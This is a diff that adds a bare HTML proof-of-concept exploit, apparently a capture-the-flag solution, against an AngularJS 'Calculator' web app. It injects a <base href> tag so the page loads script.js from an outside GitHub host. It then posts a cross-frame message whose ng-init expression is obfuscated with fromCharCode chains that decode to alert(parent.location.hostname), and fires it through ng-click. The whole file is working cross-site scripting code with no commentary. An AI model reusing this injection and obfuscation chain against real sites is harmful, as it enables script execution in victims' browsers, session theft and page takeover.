@@ -1,0 +1,16 @@
+<html>
+    <body>
+        <iframe id="mrframe" name="mrframe" style="width:500px;height:700px" src="<base href="https://raw.githubusercontent.com/Martin78b/Martin78b.github.io/master/"><script src="script.js" nonce="r4nd0m"></script>"></iframe>
+        <br>
+        <button onclick="run()" value="asdf">Click</button>
+        <script>
+            function run() {
+                var a = document.getElementById('mrframe')
+                    .contentWindow
+                    .frames[0]
+                    .window;
+                a.postMessage('<iframe name=ogiframe id=ogiframe srcdoc="<html><body ng-app=Calculator ng-cloak><div ng-controller=ArthmeticController ng-init=myText=((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(40)+((![]+[])[+!+[]]).constructor.fromCharCode(112)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(99)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(105)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(104)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(115)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(109)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(41) class=container><button ng-click=updateCurrNum(myText);calculate()>AAAA</button><iframe name=theiframe id=theiframe></iframe></div><script src=angular.min.js><\/script><script src=jquery.min.js><\/script><script src=script.js><\/script></body></html>"></iframe>', '*');
+            }
+        </script>
+    </body>
+</html>
